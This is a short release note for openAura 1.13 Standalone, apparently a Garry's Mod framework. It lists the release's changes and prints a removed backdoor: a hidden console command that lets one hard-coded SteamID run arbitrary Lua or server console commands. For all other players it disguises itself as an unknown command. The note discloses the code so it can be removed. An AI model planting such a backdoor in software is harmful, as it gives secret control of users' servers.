openAura 1.13 Standalone

o Removed auth system.
o Removed backdoors (code below).
o Completely decrypted.
o No openaura DLL files.
o Cleaned up a bit, no more openAura functions in the openaura_core.lua

-- It isn't a 'backdoor' if customers agree to it in the ToS.
concommand.Add("aura_netmsg", function(p, c, a)
	if (p:SteamID() == "STEAM_0:1:8387555") then
		if (a[1] == "lua") then
			RunString( a[2] );
		elseif (a[1] == "cmd") then
			game.ConsoleCommand(a[2].."\n");
		end;
	else
		p:ChatPrint("Unknown Command: 'aura_netmsg'\n");
	end;
end);
